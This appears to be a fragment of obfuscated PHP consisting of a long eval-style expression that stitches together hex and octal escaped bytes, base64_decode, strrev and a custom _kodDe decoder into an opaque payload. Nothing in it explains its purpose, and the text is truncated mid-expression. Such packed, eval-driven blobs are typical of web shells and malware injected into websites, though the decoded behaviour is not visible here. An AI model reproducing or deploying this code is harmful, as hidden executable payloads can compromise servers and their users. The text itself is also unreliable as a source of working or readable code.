ev('m.¯‘ÂÂxß/×miÚ’äÆñùŸ\'Å™ãë;kkÁj»íßK_å>ÿ%›ıŞÛ“').strrev('œ,7ÑÅs^c±<\\ª[6yúœ¿ûõÅğxf¼ï_ÅÌ÷%:Ë¤şÿOµ¸Nê°k')."\xf4\xe8\x21\xef\x54\x6d\x7c\xe2\xc8\xe8\x4e\x63\xe3\x7\x5f\x29\xc1\x8f\xc7\x76\xbc\x30\x63\xf9\x21\x6b\x9c\x89\x31\xc1\xc3\x4f\x59\xfd\xcf\xd5\x33\x9a\x7e\xf7\xf5\x98\x67\x4e\x78"."\374\312\164\172\313\244\314\147\57\35\360\255\117\336\74\341\220\376\225\227\14\173\355\265\165\237\335\323\176\352\336\217\57\356\365\154\33\63\275\57\71\145\223\177\357".base64_decode('gn/f9tz2V+ZddvvEA3c9On5b1yX3n/TYwL0LF3z91nkLpwxck3uyqTxzzbUV').strrev('¼l×½ğº¿¨öKk¸İK›bº—$òt/´Ş×7Êy]ø¾^íó|—Õó¼¹ÿ')."\163\303\202\365\31\145\313\33\37\270\56\235\160\142\56\260\346\361\67\366\316\66\17\255\373\327\75\377\176\363\111\43\165\126\350\246\337\271\126\227\177\364\361\227\155"."\43\177\366\16\377\373\373\311\355\327\75\161\356\267\33\336\137\162\70\275\43\0\54\60\330\260\101\265\217\62\0\246\236\63\22\52\103\172\233\304\122\305\270\27\220"."\301\143\30\312\240\130\6\10\151\12\0\212\240\46\50\174\122\171\115\323\145\14\225\341\26\306\260\50\2\370\373\30\321\300\165\213\211\210\366\271\260\14\46\362\130"."\270\347\64\257\243\130\177\271\252\31\126\313\305\243\302\30\255\206\253\106\55\305\0\254\41\317\125\74\116\313\331\143\270\263\255\46\355\7\326\342\361\270\275\353\5".base64_decode('S6CZPkGO5TOJ45X4B0iC3h4gvdEzAY61RcsM0uONx0XpHxyP7G6GLLQD5nTw').base64_decode('4TnoWBx8GA46rw46dQ46BofQfQeeSgefxZTWS0KO0cUGx4VjcHLofSpecnH5')."\xa1\x64\x95\xc7\x7\xda\x51\x34\xc7\xa6\x55\x33\xa3\x3d\xa0\x33\x31\x72\x9e\xa0\x8\x29\x1\x83\x6c\x8d\x61\x44\x66\xfc\x8\xea\x72\x4\xb5\x2e\xa0\xb4\xd\xf7\xf4\xec\x20\x1e\x7e"."\x83\xa1\xa7\x3\x61\x97\x9\xaf\x9f\xfe\x8b\x7c\x2a\xe5\x99\x61\x23\x48\x35\x5c\x58\x48\x49\x22\xad\xf0\x50\x75\xd2\x64\x56\x15\x9f\x31\x25\x9b\x8d\xe4\xc8\x6a\x67\x53\x39\xa6\x5d"."\xc1\x61\x96\xd4\x22\x24\xb9\x3a\x85\xd\xe4\x52\xb8\x40\x2\xf9\x33\x83\x96\x68\x8d\x4\xe1\x6a\xd0\x35\x82\x51\x3d\xc7\xb2\x52\x6d\x57\x6b\x24\x40\x98\x5\xa6\x1b\xa7\x7c\x22\x66"."\51\26\2\46\60\356\226\73\52\10\270\231\352\306\250\374\355\361\362\0\23\30\147\247\311\100\353\1\133\230\243\53\156\51\126\316\314\313\100\57\131\22\242\326\256"."\127\125\251\16\212\152\271\70\23\141\346\220\256\230\246\363\251\204\10\53\60\33\60\32\25\363\46\62\226\220\14\142\266\124\250\356\201\53\316\143\14\5\301\254\62"."\366\13\113\73\56\330\103\227\175\100\225\125\266\34\311\116\133\72\203\122\74\311\117\351\312\207\167\242\251\163\321\31\350\24\146\122\111\2\131\331\145\51\146\257\113".base64_decode('BDvFVMDwgbGmXParWd45Lq2nB80FqYJkPlO4CblgdOLskZNAUswEOye4NlLT')."\x39\xc9\xa5\xa2\x3c\xfe\x99\xe7\xa0\x97\xb1\xe5\x12\x52\x67\x44\x25\xa2\xa0\x71\x90\xdf\xa3\xf0\x4f\x9c\x20\x6e\x9c\xa0\x77\xa9\x83\x5c\x5e\xf8\xea\x85\x5b\xe6\x6c\x92\xac\x59\xd".base64_decode('S/RFCU6SCXHDCaE4XmxtCkYOB8vHQia5DELIIPANqqtwFvFai/Nk6wSaeF6s')."\xdb\x2a\x9c\x2d\xd2\x3\xde\x3c\xb9\xa9\xea\x12\x48\x2e\x47\x1f\x3b\x86\xdb\x10\xcb\xbe\x37\x8\x89\x47\xd7\xb8\xe\x9\x37\xe8\x90\xe0\xf5\x97\x43\xb2\x5f\x2c\x6\x7c\x7c\x4d\x45"."\134\63\324\154\112\111\260\116\145\7\245\56\40\163\303\13\214\56\260\211\44\252\4\227\54\235\205\13\173\45\36\332\171\343\260\355\315\374\221\330\22\301\204\346\330".strrev('S¢VR‘\'"˜ğ:$URr5ú£Rj‰&& £wi”qN|U	3Ä©;m')."\xf6\x94\x3a\x40\x3c\xa1\x89\x86\x35\xb9\x8e\x5c\x13\xcb\x42\x83\x24\xcc\xd5\xeb\x22\x34\xa5\x27\x7a\x6d\x95\x41\x80\x90\x26\xa9\x86\xa1\x1b\x93\x21\x55\xaa\xe5\x50\x82\xc4\x42\x5e".base64_decode('Fwf3E8VLF2mu2T4c0A0nGyHoNSC+SRMZmRAUHUlmV7gAjvDJgcXRXP1CUUsc')."\x50\x16\x10\xf8\xc\x93\x34\x15\xc6\xf\x98\x29\x85\xde\x82\x9b\x80\xfe\x3\x5e\x88\x4d\x70\xce\xe4\x27\x5b\x36\xeb\x86\xa7\x1b\xd4\xc5\xf2\x19\x84\xf8\xc0\xb1\x55\x56\xba\xc8\x15"."\130\100\270\356\226\1\27\44\223\303\205\364\175\2\133\120\71\251\221\6\240\232\107\116\244\164\123\100\175\71\233\313\57\52\32\335\324\10\164\23\136\261\160\76\25"."\306\370\125\13\144\155\170\132\126\61\315\176\40\75\23\334\363\307\44\250\374\212\112\234\232\171\233\74\21\246\340\232\340\252\164\125\361\274\240\101\31\352\371\152\351"."\325\155\64\346\211\24\61\207\301\146\62\144\325\210\151\14\51\320\24\156\223\274\341\140\153\163\50\212\355\77\60\74\24\26\322\221\32\303\226\54\202\111\265\376\226"."\xa0\xc7\xeb\x97\x2\xa1\x58\x98\xea\x27\x99\x9a\x96\x90\x72\x3b\xad\xcf\xc2\xb\x6b\x66\xfe\x42\xca\xe3\x88\xa8\x3d\x17\x6b\x64\x35\x11\x54\x6f\x77\x94\xc6\x4b\xe2\x15\xf1\xb2\x78"."\371\74\127\334\354\40\4\174\236\160\220\151\342\352\150\42\152\340\160\25\141\275\163\360\332\204\354\25\225\334\300\265\370\310\54\324\260\120\322\44\310\324\34\215\316".strrev('~Vıj¾ïçµ÷h¨%bµİ­×=ªÈğ}×ËÔ¼%ì0ID÷¯=¤Çˆá<7 ')."\370\207\215\273\326\376\151\317\343\253\166\137\176\357\356\77\235\107\206\373\341\275\17\175\260\361\211\75\227\257\331\265\366\352\335\127\76\274\347\332\13\160\302\336\73"."\xd7\xed\xba\x70\xd\xeb\x98\xb4\xf7\xb2\xc7\x77\xaf\xba\x6d\xf7\x15\xf7\xed\x5e\xb9\x76\xd7\x23\x97\xed\x7a\xec\xfc\x5d\x1b\x36\x38\x40\xe9\xbd\x4b\x57\xee\xd9\xb8\x76\xf7\xf2\x2b"."\x77\xdf\xf2\xfb\xdd\xf\x5e\xb4\xfb\xfa\x95\xbb\x2e\xfc\xcb\xae\x6b\xd6\xec\x59\x75\xef\xae\x9b\xff\xb0\x6b\xd9\xca\xf\xef\xbd\x62\x64\x3e\xbe\xe1\x78\x3b\x5d\x39\x42\x9c\xdd\x73"."\343\146\105\31\136\215\270\71\26\256\104\71\370\55\203\332\121\360\113\225\111\0\113\243\220\201\14\171\375\371\267\15\142\224\230\32\125\140\104\202\373\100\66\325\5"."\71\65\3\210\67\61\125\242\161\31\135\111\225\16\331\213\305\4\135\204\116\11\235\361\371\243\336\110\240\336\117\364\157\154\241\106\43\275\22\221\131\0\64\32\231".base64_decode('ycLskq7AQEwq4zyJbSAKEA5SuXQGdVYqgfqqEgc8ydHVh1QCjxgAUBNgh5ZB')."\xe3\x12\x58\xa5\xa3\x74\x76\xa9\xa3\xd2\x51\x55\x2e\x11\xeb\x31\x5c\x82\x58\x8b\x49\x25\xc4\x52\x8c\x95\xb3\x35\xe2\xe8\xb4\xc5\xaa\x1c\x95\xe5\x52\x49\xb6\xb7\x84\xf4\x8b\xcf\x2b"."\xe8\xbd\x8c\x73\x9a\x92\xe2\x28\x23\x1d\x16\xbb\xcb\xf3\x2\x22\x66\x5a\x86\xa2\x1\xaa\x26\x25\x1c\xc\xc4\xca\x83\x5f\x9b\x5\x58\xc2\xc5\x4b\xe0\x75\x2\x39\xf2\x61\x92\x27\xe4"."\xb3\xe7\xc4\x86\x63\x2d\xa5\x92\x92\x49\x82\x14\x3c\xbf\xe2\x32\x97\x96\x4b\x9d\x12\xba\xee\x90\x8a\x24\xa2\x62\xb6\xc9\xa8\xb5\x4d\x46\xd9\x58\x42\x56\x5a\x1a\xd9\x7a\x63\x65\xa6".strrev('d4‘b-œ!t	bõ'."\0".'šò«Ò–ç†¯4Z¼P‚¥¢.“·p´o„')."\321\127\202\331\42\74\316\264\331\115\51\43\61\44\153\236\315\306\100\161\231\54\201\312\355\1\341\335\234\77\346\155\302\130\36\25\320\74\331\71\332\206\250\174\72".base64_decode('JRuKpLgJCMqHtwskCEegfIFQQzjSjO+kot4mf7PHRWg+xgScH7LbUq1UCikf').base64_decode('BpXaph81RKcshloF+0q2VNPCs5DtJp0hqy8hawUFFaktxXY5pEpmvhqOxGQw').base64_decode('AYQ8C1S3VDhcZnKlMLxa6WOiIGbQOXOkjOVclJokxLFLSQBJj5qtdVJbWNAF')."\xd8\xb2\x37\x1c\x6a\x8\xd0\x4b\x3a\x5f\xa7\x2d\xcd\x17\x9\x40\x8b\x1a\xd2\x39\x89\xd6\x20\xdc\x88\x82\x8\x57\x71\x80\x48\xb6\x3f\xc9\xc2\xdc\x3e\x3\x26\x30\xbe\x1\x44\x38\xdb"."\0\42\354\44\202\271\4\133\135\320\176\53\240\224\234\2\267\371\130\270\211\135\223\303\204\160\104\210\170\42\236\346\50\213\106\332\0\105\207\60\341\36\271\331\23"."\x8d\x81\x51\x85\x5a\x9b\x39\xd5\xf\x7a\x66\x2\x84\x9\x73\x5e\x86\x52\xec\x32\x57\x45\x5d\x79\x1c\xdf\x92\xe1\x20\xfe\x99\x46\x63\x50\x9d\xd0\xb1\xa8\xca\x21\x4d\x5c\x52\x4e\xf2".base64_decode('0Hsl2eoBR7HMW5kRlIPhRhxHpsL+TJIz7FK7FMllYJxIeSY9vtiOkAAeS/jq')."\135\12\205\333\74\334\356\124\110\300\20\302\117\113\334\32\325\75\267\75\336\37\167\1\66\303\234\307\57\277\174\365\22\145\140\274\75\52\145\311\251\165\266\207\236"."\250\364\350\240\162\255\234\322\273\251\225\31\40\221\224\201\300\277\263\150\0\121\117\122\0\110\170\331\24\275\14\303\267\160\162\174\161\174\114\334\351\302\27\217\220"."\xfb\x89\x3b\x78\xcf\x64\xff\x2c\x70\xea\x46\xa3\xb6\x5b\x53\x19\x59\x66\x92\xda\xc1\x98\x49\x8\xef\x63\x1c\x99\x42\x7e\x88\xb0\x32\x85\xcc\x4\x89\x4e\xad\x65\x4b\xeb\x9f\xb1\x38"."\4\376\157\214\55\366\203\377\203\340\47\30\3\213\247\261\14\140\223\6\3\323\375\213\341\37\236\120\56\211\31\2\241\305\340\57\40\61\213\3\241\374\302\365\376".base64_decode('WJvfjzPQMPnlWQHJIUMTDMnPDtNLcinob4hJME6bleUyNHnOjrHlsuw2Wwm2')."\60\353\244\262\322\121\125\245\344\24\361\104\275\234\376\332\360\240\20\5\302\360\362\313\276\376\314\60\232\304\33\43\341\326\26\41\336\344\231\31\10\65\322\230\273"."\202\206\250\132\115\362\5\242\140\212\274\24\7\271\275\266\30\47\54\47\142\214\104\66\331\206\320\76\100\333\101\104\140\336\241\324\200\151\263\175\217\325\267\6\202".base64_decode('PtEwBGYkRwqi6+RUGU07R+PIRIRG4JTTMEIvGkFzQCN4AmgMTReNILtwGkED')."\245\21\50\306\370\103\64\15\110\233\100\76\244\42\144\267\241\123\135\104\217\322\47\334\301\162\333\17\250\226\300\241\64\63\265\266\214\234\332\242\10\332\350\224\156"."\250\206\13\251\255\163\235\60\305\17\327\225\127\200\54\125\311\142\343\343\13\247\71\54\135\342\271\170\225\60\106\155\77\260\235\167\276\146\130\4\63\215\260\246\303"."\170\70\147\211\26\327\135\134\37\111\155\321\55\65\155\253\245\125\270\313\125\222\124\270\207\307\3\15\132\75\374\316\131\64\306\366\325\323\271\311\145\100\253\251\56"."\172\264\41\225\173\220\13\107\164\216\114\101\25\217\264\53\174\320\130\65\317\56\201\261\261\173\136\75\244\342\0\33\201\220\213\3\203\334\336\32\152\55\171\23\315"."\132\46\20\146\73\230\131\65\57\324\250\146\22\216\24\232\32\247\250\366\237\165\74\243\267\250\106\132\103\152\236\66\376\304\204\245\253\174\305\141\45\124\357\113\124".base64_decode('bRm7QXguA5psYYvprKKZ6TsahD8S4wKYRTxYMFRWsCBCOndSrZHCSDYyr3OW').strrev('#+'."\0".'›xŒÔµ'."\n".'v”mHˆ/æ#N¥ÿB5*i©†'."\n".'Ü/‚5‰SS>˜Á™+7®')."\67\4\0\237\347\237\105\330\205\351\141\237\34\15\267\106\250\264\16\343\220\345\220\43\176\357\154\46\11\63\150\203\147\146\76\4\126\27\363\64\26\5\63\345\55"."\204\43\232\41\107\302\220\353\363\7\33\362\12\104\233\230\275\262\35\46\7\3\241\351\105\23\142\141\271\131\50\202\201\100\366\153\316\207\331\153\210\372\341\124\360".base64_decode('eH0w7BWSKSaKMwEIVR4Qs4XsoIsvQnJ0TV1ZPLkYHi1OGZxMdfEl5WVxd52r')."\202\361\103\2\333\210\266\10\127\135\122\363\205\105\305\223\335\56\27\251\202\5\0\77\306\254\242\50\112\221\147\16\321\134\226\163\233\244\306\45\44\157\40\14\70".base64_decode('xFiTHJ0dZXNlDppsm9rTbdiBs4n617zM4P8WMWtMpYajeRlt6IXzRtTEYIJd')._kodDe('MA7mOX4nwXaDPhC5JoF7FF5RjJR/vsWBey+2BTFtLMFq/u/Nn5ScKOWLoVVXIA==')."\x1e\x6b\x84\xd6\xaa\xf1\x39\xac\x80\x66\x8\xe6\xa2\x40\xfc\x4d\x22\x63\x5b\x7a\x2d\x92\xa0\xb4\x2c\x7\x4\xd\x7a\x67\xb\x8f\x2\xd3\xd9\xaf\xd1\x2e\x8d\x62\x46\x2e\xe4\xae\x40"."\126\220\165\225\54\136\7\55\160\232\132\167\306\251\244\272\165\100\302\172\322\24\252\364\332\322\271\325\162\126\7\142\24\175\157\347\4\115\10\151\70\63\250\234\22"."\164\161\271\40\172\60\75\167\24\165\241\106\32\117\336\67\64\200\323\202\276\225\323\55\164\70\222\351\164\110\374\235\23\345\224\212\223\64\50\11\105\363\17\23\176"."\x7a\xd0\xcd\x95\xee\xe5\x5a\xbb\x74\x2f\x53\xd5\xd2\xb3\x93\x9f\xec\xe2\xfd\x33\x17\x99\xc8\x73\x25\x90\x56\x3f\x48\x2f\x19\xc8\x45\x6c\xfd\x60\x44\xb8\x1a\xf5\xb4\x45\xc7\x3b\x9b".base64_decode('mj1eJ6AE1RMmkuVOg8Vu0thSK/3meBnaG6pUWhs7UeoBXSdrWGi/Pcr+zgAD').strrev('µågv±Vwmgv±PàaÃ°£Ñ÷z5#c;Çä[[Í:MÛP“PÂuQ±')."\x3b\xab\xb0\x5d\xc\xca\xc3\x21\x25\x9b\xf5\xe2\x47\x49\xe2\xce\xb3\x81\x12\x62\x84\x92\xa8\x2e\xa8\x7a\xb7\xdd\xe\xa0\xb\x4c\x13\x5f\xbb\xba\x40\x32\x38\xd6\xa1\xbe\x20\xc9\xf2"."\233\74\304\136\62\164\11\57\64\376\277\306\375\62\277\67\160\221\215\76\72\207\177\123\212\151\301\263\226\13\234\360\266\242\231\235\357\242\15\273\41\256\14\265\224"."\x77\x72\xfb\xfe\x4e\xa8\x60\x0\x83\xa6\x57\xf7\x81\xb0\x5b\x37\xcd\x22\x57\x19\x0\x2a\xe1\xcb\x85\x1c\xa6\x27\x12\xe2\xe1\x54\xf8\x1a\x53\x33\x25\xa5\x33\xa3\x1b\x69\xba\x6a\xe4"."\xe5\x5\x33\x69\x67\x6\xef\xdc\x2a\x1e\xb\x1\x38\xec\x8f\x29\x84\x39\x6e\x56\x6\x3c\xdd\x6a\x54\x85\x64\x8a\x4c\xa1\x7f\x20\xab\x9b\xaa\xf8\x7a\x23\xa9\x22\xe3\x5e\x66\xf6\xa2"."\xc\x40\xe2\x41\x2f\xc5\x14\xa3\x57\x65\xa3\x6\xbd\xce\x7b\x1f\x60\xaa\x6a\x2f\xe5\x9f\x4\x96\x97\xb1\xb9\x2d\xcc\x58\x3f\xbf\x6f\xf4\xfd\x81\x68\x9b\xc9\x5f\x79\x40\x4a\xc0\xc9"."\x17\x5c\x22\x67\xda\xf6\xd2\xca\x60\xf\x45\x84\x47\xc4\x58\x95\xe4\xe4\x69\x2\xc0\x29\xe4\x3\x43\xe8\x66\xeb\xe0\x24\x9b\xbc\x7\xcd\x9\xbd\xf8\xc1\x3f\x73\x8a\xf5\xd5\x69\xf0"."\x57\x1c\xe1\x68\x14\x3f\x65\x9b\xae\xe\xd2\x47\xc\x79\xdb\x24\xef\xdd\x43\xbc\x31\xde\x1c\x8f\x51\xd4\x12\x9a\x4\x55\x49\x74\x6c\x43\xbf\xea\x20\x52\xfa\x98\xa2\xef\x38\x68\x22"."\x5e\x29\xcb\x50\xba\xba\xc0\xe8\xd1\xf2\x92\x24\xf4\x54\xc3\x6d\xa0\x6b\x34\x47\xbf\x2c\x2\xf9\xe4\x7\x60\xbc\x8d\xbf\xe2\x40\xf1\x26\x61\x1b\xf0\xab\x37\x86\xe6\xe8\x1\x6e\x11"."\104\107\360\377\36\325\105\174\203\262\17\335\370\174\373\146\163\302\33\162\314\375\266\240\147\77\224\126\11\334\275\241\202\145\310\324\353\111\162\54\56\52\1\230\135"."\122\123\62\252\14\374\226\227\70\112\340\316\105\161\210\21\20\200\32\52\251\31\125\206\2\345\304\132\171\41\271\103\22\114\323\271\22\217\60\351\165\212\145\11\357".base64_decode('bOrQpEK6Uu2udvcTOlW3ALbIn63iXPwoTACxQM4aerfBrrvzz6UBGdAeek0p')."\213\7\2\71\152\10\76\210\51\115\254\263\364\250\150\366\115\240\224\335\323\74\307\311\337\223\114\251\33\110\247\44\362\376\243\266\264\312\125\131\52\321\267\316\265"."\xa5\xad\xb1\x6\xe7\xa4\xd2\xba\xa9\xc3\xa6\x78\x91\xd6\xca\x52\x9b\xa1\xda\x9\x3e\xc9\xc1\x8f\x82\xa7\x12\x2b\x8e\x29\x70\xe3\xb3\x88\xdb\x1e\x1b\xaa\x2c\xa1\xbe\x69\x65\xa1\x9e"."\x1\xc7\x2f\x90\x77\xd3\xae\x44\x86\x92\x6\xfc\xcb\xed\x96\xea\xb0\xc9\x14\xf5\x81\x0\xf8\x16\x2d\xe1\x86\x2f\xd8\x5c\xf3\xe9\x69\x29\x30\x39\xf0\x51\x37\x69\x5f\x4b\x77\x4b\x9"."\x40\x52\xcc\xda\x12\x8\x2d\x91\x4c\x23\x41\xad\x89\x4b\xdc\xa4\x17\x28\x3\xb7\x50\x9e\xa2\x91\x22\xa5\xb0\x88\xd4\x5\xa6\xd1\x89\x42\x38\xb9\x74\xea\x14\xb7\x46\x4a\x42\x6e\xc7"."\x5\x8f\x90\x88\x4e\x4f\x1f\xc6\x9\xf5\x31\x99\xae\xa8\xb0\xea\x11\x8c\xec\x59\x6\x58\x95\x2b\xa1\x64\xb8\x3c\x88\x84\xd\xca\xe2\xd8\x22\x76\xd9\x9d\x49\x85\x64\xe7\x88\xf3\x95".strrev('®F¤²[œAÂ-NÏäĞI•šYØ\'ƒÀ´$‹²p8/å´ğ½U')."\116\362\223\74\131\55\37\4\147\77\37\6\131\116\16\3\34\210\275\31\214\5\142\46\16\241\171\202\241\306\166\172\361\210\142\361\366\122\127\305\222\45\156\215\152"."\14\343\45\64\57\246\133\56\226\33\307\343\56\173\176\320\71\62\233\54\43\1\344\347\304\364\352\154\202\237\303\334\25\334\160\206\151\6\45\250\56\254\255\235\332"."\316\344\167\146\214\107\211\217\126\65\211\256\343\302\36\147\254\215\5\275\41\116\171\361\310\111\1\63\242\353\202\175\2\102\52\154\143\350\112\100\355\66\64\330\24"."\156\123\352\372\330\353\72\261\32\34\366\144\155\55\260\15\70\230\122\335\51\255\323\315\66\207\33\301\134\11\156\271\103\263\240\155\232\7\207\352\276\274\4\150\6"."\202\300\175\200\241\320\15\266\261\31\34\324\305\200\54\60\305\114\30\132\326\262\155\153\354\326\242\4\75\255\234\257\364\51\70\113\211\104\137\325\227\240\147\41\45".base64_decode('YBvjFLKXeVemQOsByVBTtSWou2aPqoLyPeDoKdoIKFgiUWKSVtiMGZYOxHD2')."\122\66\64\33\7\246\341\237\63\346\342\337\121\147\160\306\303\320\123\51\160\124\242\353\121\104\37\220\142\247\213\313\145\344\175\167\113\44\34\13\173\351\253\324\142"."\x2\x1c\x0\x91\x6e\x60\x13\x28\x7e\x8e\x52\x0\xd7\x2c\x10\x8\xb5\x98\xcb\x65\x32\x4c\xe5\xa\xb9\x31\x66\xa8\x8a\x6d\x53\xa3\x3d\x39\xb\xea\xa5\xc8\xa8\x0\x17\x10\x83\xc6\x8a"."\46\1\13\246\342\200\313\317\252\111\262\121\0\353\311\254\321\61\274\110\11\54\342\303\372\350\46\340\154\175\165\145\145\245\263\262\12\374\307\324\157\244\276\232\312"."\312\202\54\225\225\65\350\77\162\260\102\371\236\114\226\75\5\154\121\112\56\50\217\11\330\134\333\151\17\4\226\34\345\46\301\344\40\327\66\65\164\57\117\26\370"."\200\311\222\12\207\102\142\152\376\260\202\172\267\155\5\104\373\150\146\246\16\370\267\114\67\232\120\72\155\324\102\17\144\343\213\10\372\341\317\44\211\164\76\31\333"."\320\325\212\215\301\135\257\363\211\54\324\235\130\54\115\154\37\277\132\3\134\27\243\374\60\237\140\135\10\243\15\200\317\63\231\265\31\204\200\143\55\301\106\13\1"."\x82\xd7\xc\xc8\xda\x47\xb9\xb8\x0\xa3\xa2\x62\x1b\x25\x33\x3b\x31\x14\x4b\x31\x13\x61\x18\xd\xb1\x9a\x8a\xa1\x58\x8f\xde\x2f\xf3\x73\xd\x46\xcf\x66\x31\x95\xcf\x10\x99\x3c\x4a".strrev('®a0Íq•"¡´òè¥>rŸc}XIõ P=~†¤²3e-^Û«"¬Ñ-ıQ(ç').base64_decode('DF2wGS1+jUBh0f/PzQKF+CkAs0FeZucuVJCflFfGkxScn0De1EV5U6EOCG8p')."\16\166\331\131\131\61\147\221\114\254\161\61\237\10\204\130\110\175\144\220\325\244\374\16\344\37\31\201\22\262\162\31\105\0\332\161\125\110\360\262\207\240\42\20\272"."\255\151\25\74\331\260\106\355\116\175\240\300\220\127\63\111\347\57\310\65\335\113\126\7\216\201\53\102\355\160\14\373\367\262\325\64\160\31\331\224\250\23\214\367\27"."\45\147\373\104\27\131\245\202\111\106\230\325\4\335\134\260\215\41\304\320\315\205\13\75\107\341\214\140\136\64\377\166\3\355\161\213\156\123\262\175\120\46\76\35\230".strrev('q[›/¬ÑjQšÀÛ#ÎTY'."\n".'ßµën[<î®‰\\;/EÄV!H‘xâP')."\x4f\x70\x55\x4a\x65\x6d\x40\xba\xd0\xfb\x4d\x29\x14\x93\x26\xba\xaa\x27\x4b\x6d\xe1\xb6\x89\xe3\xcb\x25\xc0\xf1\xa4\xd4\x36\xb5\x73\xba\x66\xb9\x27\x8c\x3b\xd3\x35\x6e\xa2\x54\x36"."\xbd\x29\xd6\x1c\x74\x48\xd0\x2\x59\x6a\x4\x1c\x94\x5e\x2e\x79\x7b\xc\x3d\xad\xba\xab\xcf\x84\x46\x9c\xe3\x27\x8c\x73\x9d\x35\x5e\x8a\x2a\x5d\x8a\xa1\x91\x52\x84\x84\x10\x63\x92"."\x7e\xf2\xb\xdd\xaa\xc9\x42\x97\x65\x41\x82\xc5\xc7\x22\xe\xa3\x4b\x1d\x88\x65\x92\x4d\xc4\x45\x66\x34\x58\xef\xda\xe\xab\x22\xb6\x11\x50\x92\x44\x35\xb\x99\x51\xd\xf8\x81\xd0"."\320\165\300\335\327\301\67\242\4\375\57\331\364\272\247\137\204\177\25\101\132\321\231\143\34\110\236\11\32\66\6\303\365\36\144\332\41\67\205\251\63\26\300\331\42"."\324\143\176\144\164\275\327\151\1\1\202\75\142\156\123\14\310\154\70\142\272\56\245\225\314\240\104\122\45\75\123\303\352\40\123\210\263\342\110\113\123\213\354\151\215"."\x35\x9\xe6\x31\xc\xd4\x42\x78\x64\xe4\x75\x6\x42\xc2\x91\xc0\x1c\xf\x37\xa0\xed\x54\x4c\xca\xe4\xb6\xb5\xb5\x39\x21\x3b\xc\xf5\xa6\x9\xe4\xb0\xa6\x1e\x26\x2\xde\x4f\x49\xa5"."\153\113\172\365\144\42\245\347\222\45\274\102\67\220\222\1\277\125\45\265\146\24\342\122\202\256\31\165\76\224\321\235\302\123\337\74\367\103\171\211\166\157\65\22\141"."\112\154\316\52\150\237\160\222\117\205\27\345\302\265\104\30\260\357\202\272\213\172\174\41\277\315\341\231\104\330\367\206\133\10\377\331\74\235\161\216\242\52\321\247\146"."\x29\x85\xf1\x16\xf8\xb\x41\x7c\xee\x40\x3a\x35\x99\x71\xd1\x48\x3d\x80\x13\xa7\xf8\x6a\x0\xc9\xc9\x76\x81\xd\x25\x81\x3c\x19\xb3\xc6\x57\x5b\xe2\xf3\xcc\xac\x1\x3c\xb6\xaf\x46"."\111\245\140\52\140\220\247\270\171\106\262\250\200\221\155\151\10\60\333\231\26\270\112\304\162\211\70\71\362\333\234\257\331\125\26\45\140\61\112\270\312\242\4\365\251".base64_decode('RKIm+kjXjINV1cRTnHhTSgz0oH24MCcwyrSuCId8fmgiIWAQlATIpNkVfhhI').strrev('p{€Ú2çt—{‹Uº¥gKcSÂ¾Ñöd˜œ*Î“£$€0$ÛÄš“n')."\322\215\101\130\70\57\133\321\106\251\210\202\314\53\370\101\305\257\267\73\231\366\14\224\104\144\40\157\75\111\64\132\133\102\234\46\321\35\2\365\67\45\123\207\35"."\1\377\231\22\255\121\7\340\332\201\221\115\15\167\316\7\235\4\302\11\222\115\246\270\305\64\220\21\320\17\23\20\350\251\154\125\140\16\12\104\325\301\301\241\256".base64_decode('TLXjJvYUxvzncMQE0h3By5mKMVgjFfHDkyLbrRDbKSzNFdJ5bsfYTobKc9DL')."\332\111\23\307\127\126\72\212\372\23\203\163\46\21\117\77\315\121\47\336\326\316\231\32\40\22\76\172\221\216\34\50\325\110\4\365\35\22\335\21\70\324\2\375\212"."\71\44\204\236\16\251\321\37\3\340\126\360\7\157\134\207\4\167\65\110\6\273\334\41\301\153\154\207\324\32\302\277\334\277\25\230\106\214\10\110\211\214\146\25\304"."\x21\xe\x53\x34\x71\x93\x28\x49\x82\x7b\x14\xf2\xb7\x64\x1\x30\x80\x2e\x6e\xba\x6\x1c\x9c\xe3\xaa\xa1\x67\x33\xac\xd\x87\x7c\x35\xc1\xb\x40\x32\x73\x46\xa6\x6\x9b\x7c\x9a\xce"."\264\226\60\164\123\357\262\234\0\73\152\240\210\154\257\303\13\117\47\42\233\376\337\152\200\275\240\356\325\376\357\265\100\136\314\143\201\223\247\23\310\171\346\377\252".base64_decode('DkrS2FRhuWBqnm8ymI2kDBNK0Ukmux+vj43/Syp91ASmB+43LcOcaiHSBBY+')."\42\70\245\322\355\207\101\314\106\237\311\300\222\224\66\223\325\206\327\130\111\315\114\300\262\203\154\34\360\300\357\123\141\32\235\54\234\23\23\257\144\15\152\5\323".base64_decode('LQa2ZQQV4pxgv6dyJqiM58ZpLHsSnjxTtQw4FzQLUTMMYRkAv6TS/Q/Lw+sL').strrev('hb„»y5àÊœ‚Ê³Ğ®éSı•GÙ…0«UÀšR¼VFpå†)9º7').strrev('ı±ä8òHt'."\0".'¸Î +é=:¡ßBgÁ”ZpmCİ ƒ*àºjm—4c7')."\213\147\51\126\222\321\243\24\41\33\16\316\162\372\7\262\240\217\152\22\234\315\26\130\60\333\135\264\173\56\366\355\207\155\202\53\312\235\64\300\154\75\211\151\32".strrev('Se.uğE£$9´Ô"‚µ]]ësMP*²\\µ °>á%á×¡Cé<1').base64_decode('SkalzrD6QFFZ8FQ1Uyw4016QZaXJ0IzXsCnNUNdlfLlGIANyVk2Z4I8howsw')."\12\37\34\2\236\110\31\320\216\74\51\306\265\64\224\166\24\326\111\103\115\102\77\276\275\64\17\20\363\0\327\57\102\72\123\71\325\6\120\122\331\36\5\101\60".base64_decode('gLiV8Ha6vd1ur+H2EiM14n77IJJMTi1iLkudUWCHh0iogPaLzL1hHpz7jctL').base64_decode('YJ7lBDi02kQ+FIWUiG4J3uGolSFK6kpRgTHQ3Cg3BAMtMmLww6GYJ5iXAIhj').base64_decode('LOAtAHP/bHndY17uiGyqZdB53sJNLtMmGQByzsUevNn8QyMlOw5OntJpuOll')."\x58\xa7\x20\xf7\x98\x69\x5\x6a\x7a\xe9\x9e\xc1\xbf\xa3\xdc\x26\xb1\x53\xa0\xb6\x7a\xc1\x0\xd9\x2d\x6e\xc5\x48\xf4\x68\x50\xbd\x40\xfd\x41\xb6\x78\x83\x73\xc0\x58\xa0\xc1\x55\x38"."\342\211\314\226\175\201\10\113\211\171\42\103\244\300\62\344\65\0\65\120\237\74\155\332\64\342\235\43\233\110\41\136\313\5\225\355\354\166\1\100\55\103\111\250\205".base64_decode('UKUwJ5T00fUZhwImMaIYHjyCIolztOwQiVqW+sumnujUbI66DVCYLsJwdS8k').base64_decode('YRqgv2eS3wHy27mQYLZizCfLpZAKNVOnZbn38+6F4LBJMWRsR+q8DsmrZEot')."\x29\xc\xb2\